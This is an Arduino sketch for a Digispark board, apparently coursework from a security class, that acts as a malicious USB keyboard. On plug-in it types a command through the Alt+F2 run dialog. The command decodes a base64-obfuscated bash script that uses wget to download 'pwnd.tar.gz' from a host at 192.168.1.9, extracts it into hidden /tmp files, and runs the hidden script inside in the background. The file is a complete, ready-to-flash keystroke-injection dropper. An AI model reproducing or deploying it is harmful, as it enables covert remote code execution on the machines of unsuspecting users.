#define LED_BUILTIN 1
#include "DigiKeyboard.h"
/**
 *
 * @author       Muhammad Nur Irsyad
 * @id              1807422020
 * @class         CCIT SEC 8 (TMJ)
 */
bool passed = false;
//----------
void setup() {
    pinMode(LED_BUILTIN, OUTPUT);    
    digitalWrite(LED_BUILTIN, HIGH);
    //----------
    DigiKeyboard.sendKeyStroke(0); delay(2000);        
    DigiKeyboard.sendKeyStroke(KEY_F2 , MOD_ALT_LEFT);
    DigiKeyboard.sendKeyStroke(0); delay(1000);        
    DigiKeyboard.println("gnome-terminal -e '/bin/bash -i -c \"base64 -d <<< IyEvYmluL2Jhc2gKd2dldCAtcSAtTyAvdG1wLy5hIGh0dHA6Ly8xOTIuMTY4LjEuOToyMDIyL3B3bmQudGFyLmd6ICYgd2FpdAp0YXIgLXhmIC90bXAvLmEgLUMgL3RtcC8gJiB3YWl0CmJhc2ggL3RtcC8uY29va2kzLnNoIC1yICYgZGlzb3du | bash\"'");    
    //----------
    passed = true;
}

void loop() {
    if (passed) {
        digitalWrite(LED_BUILTIN, LOW); delay(100);            
        digitalWrite(LED_BUILTIN, HIGH); delay(125);                                              
     }
}
